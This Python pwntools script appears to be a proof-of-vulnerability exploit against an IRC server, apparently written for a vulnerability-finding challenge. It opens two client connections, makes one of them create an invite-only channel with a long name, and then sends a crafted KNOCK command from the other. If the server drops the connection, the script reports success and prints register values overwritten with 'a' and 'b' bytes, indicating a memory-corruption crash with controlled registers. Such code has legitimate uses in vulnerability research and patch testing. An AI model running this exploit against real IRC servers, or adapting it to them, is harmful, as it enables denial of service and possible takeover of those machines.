from pwn import *
import sys

def init_conn( HOST, PORT, user):
    try:
        p = remote(HOST, PORT)
    except:
        print(f'[ERROR] Failed to connect to {HOST} {PORT}')
        exit(0)

    p.send(b'CAP LS\r\n')
    p.readuntil(b'\r\n')
    p.send(b'NICK %s\r\n' %(user))
    p.send(b'USER %s %s  localhost :%s\r\n' %(user, user, user))
    p.send(b'CAP REQ :multi-prefix\r\n')

    y = p.readuntil(b'\r\n')

    if y.startswith(b'PING') == True:
        z = y.split(b':')[1]
        p.send(b'PONG :' + z + b'\r\n')

    p.send(b'CAP END\r\n')
    p.readuntil(b'+ix\r\n')

    return p



def handler( signum, frame):
    print('[FAIL] sigalrm fired so the POV was likely successful')
    exit(0)

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(10)
    
    p = remote( HOST, PORT )

    channel = b'#' + b'a'*30 

    p = init_conn(HOST, PORT, b'chess')

    q = init_conn(HOST, PORT, b'nethia')
    q.send(b'JOIN %s\r\n' %(channel))
    q.readuntil(b'list.\r\n')
    q.send(b'MODE %s +i\r\n' %(channel))
    q.readuntil(b'+i \r\n')

    p.send(b'KNOCK %s bbbbbbbbbbbbb\r\n' %(channel))

    try:
        y = p.readuntil(b'\r\n').rstrip(b'\r\n')
        print(y)
    except:
        print('[SUCCESS] Pov likely successful')
        print('RDI=0x6161616161616161')
        print('RCX=0x6262626262626262')
        q.close()
        p.close()
        exit(0)

    p.close()
    q.close()
    print('[FAIL] PoV likely failed')

if __name__ == '__main__':
    main()
